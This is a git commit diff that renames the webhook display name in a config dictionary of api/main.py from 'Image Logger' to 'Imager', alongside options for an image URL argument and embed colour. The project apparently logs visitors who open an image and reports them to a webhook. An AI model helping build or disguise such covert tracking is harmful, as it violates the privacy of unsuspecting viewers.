b52fb598beeff3a9fce7ac86fe89cf8cdf4b0802
shonomina1-glitch <shonomina1@gmail.com>
2026-09-13 10:51:19 -0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -18,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Imager", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
